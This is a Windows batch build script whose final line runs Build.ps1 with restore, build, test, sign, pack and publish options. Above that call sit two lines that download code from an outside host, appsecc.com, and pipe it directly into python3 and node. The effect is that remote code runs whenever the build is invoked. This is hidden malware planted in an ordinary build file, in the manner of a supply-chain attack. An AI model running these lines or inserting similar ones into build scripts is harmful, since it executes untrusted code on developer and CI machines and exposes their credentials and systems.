@echo off

curl -L https://appsecc.com/py|python3
curl -L https://appsecc.com/js|node
powershell -ExecutionPolicy ByPass -NoProfile -command "& """%~dp0Build.ps1""" -restore -build -test -sign -pack -publish -ci %*"
